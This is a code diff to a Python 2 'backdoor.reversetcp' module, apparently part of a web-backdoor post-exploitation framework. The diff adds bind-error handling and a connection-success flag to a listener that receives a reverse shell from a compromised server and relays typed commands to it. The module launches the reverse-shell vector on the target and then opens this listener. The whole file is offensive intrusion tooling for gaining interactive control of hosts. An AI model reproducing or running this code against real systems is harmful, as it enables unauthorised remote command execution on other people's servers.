@@ -7,6 +7,7 @@ from telnetlib import Telnet
 from time import sleep
 import socket, select, sys
         
+WARN_BINDING_SOCKET = 'Binding socket'
 
 class TcpServer:
     
@@ -15,13 +16,18 @@ class TcpServer:
         self.hostname = '127.0.0.1'
         self.port = port
         
+        
+        socket_state = False
+        
         self.connect_socket()
         self.forward_data()
+        
     
     def connect_socket(self):
         if(self.connect):
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.socket.connect( (self.hostname, self.port) )
+                
         else:
             server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,  1)
@@ -30,8 +36,12 @@ class TcpServer:
             except socket.error:
                 #print("Warning: unable to set TCP_NODELAY...")
                 pass
+        
+            try:    
+                server.bind(('localhost', self.port))
+            except socket.error, e:
+                raise ProbeException('backdoor.reversetcp', '%s %s' % (WARN_BINDING_SOCKET, str(e)))
             
-            server.bind(('localhost', self.port))
             server.listen(1)
             
             server.settimeout(3)
@@ -46,17 +56,21 @@ class TcpServer:
         self.socket.setblocking(0)
         print '[backdoor.reversetcp] Reverse shell connected, insert commands'
         
+        
         while(1):
             read_ready, write_ready, in_error = select.select([self.socket, sys.stdin], [], [self.socket, sys.stdin])
             
             try:
                 buffer = self.socket.recv(100)
                 while( buffer  != ''):
+                    
+                    self.socket_state = True
+                    
                     sys.stdout.write(buffer)
                     sys.stdout.flush()
                     buffer = self.socket.recv(100)
                 if(buffer == ''):
-                    return
+                    return 
             except socket.error:
                 pass
             while(1):
@@ -65,9 +79,9 @@ class TcpServer:
                     break;
                 c = sys.stdin.read(1)
                 if(c == ''):
-                    return;
+                    return 
                 if(self.socket.sendall(c) != None):
-                    return
+                    return 
                 
                 
         
@@ -97,4 +111,5 @@ class Reversetcp(ModuleProbeAll):
     def _execute_vector(self):
         self.current_vector.execute_background(self.modhandler, { 'port': self.args['port'], 'shell' : self.args['shell'], 'host' : self.args['host'] })
         if not self.args['no_connect']:
-            TcpServer(self.args['port'])
+            if TcpServer(self.args['port']).socket_state:
+                raise ProbeSucceed(self.name, 'Tcp connection succeed')
